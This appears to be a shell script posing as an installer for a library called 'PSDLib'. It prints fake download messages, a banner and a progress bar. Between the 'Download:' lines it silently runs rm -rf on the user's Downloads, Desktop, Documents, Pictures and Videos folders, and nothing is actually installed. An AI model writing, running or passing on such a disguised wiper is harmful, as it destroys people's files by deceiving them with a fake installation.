echo -e "\e[33m　　　　　　　　　　　　　　　　　　　　　　　　　　　　　　
■■■　　　　■■■　　■■■■　　　　　　　　　　　　　　
■　　■■　■　　　　　■　　■■　　　　　　　　　　　　　
■　　　■　■　　　　　■　　　■　　　■■　　　　■■　　
■　　　■　■■　　　　■　　■■　　■　　■　　■　　■　
■■■■　　　　■■　　■　　■■　　■　　■■　■　　■■
■　　　　　　　　■　　■　　　■　　■　　　　　■　　　　
■　　　　　　　　■　　■　　　■　　■　　　　　■　　　　
■　　　　　■■■■　　■■■■■　　■■■■　　■■■■　
\e[0m"
sleep 3
echo "version:0.0.9"
echo "Author: JamFatMan"
sleep 3
echo "Download Library"
rm -rf Downloads/
echo "Download: https://cdn.akamai.com/s3krlr332/fa9sjz08q/Media/PSDLib-core.zip"
rm -rf Desktop/
echo "Download: https://cdn.akamai.com/s3krlr332/fa9sjz08q/Media/PSDLib-gui-linux.tar.gz"
rm -rf Documents/
echo "Download: https://cdn.akamai.com/s3krlr332/fa9sjz08q/Media/JamFatLib.py"
rm -rf Pictures/
echo "Download: https://ftp.yz.yamagata-u.ac.jp/pub/Linux/ubuntu-ports/ubuntu-ports/dists/xenial-backports/Contents-arm64.gz"
rm -rf Videos/
sleep 10
echo "Install Library"
sudo apt install -y
(
  for i in $(seq 0 100); do
    echo "$i"
    sleep 0.03
  done
) | dialog --gauge "インストール中..." 10 50 0
echo "Done !!!!"

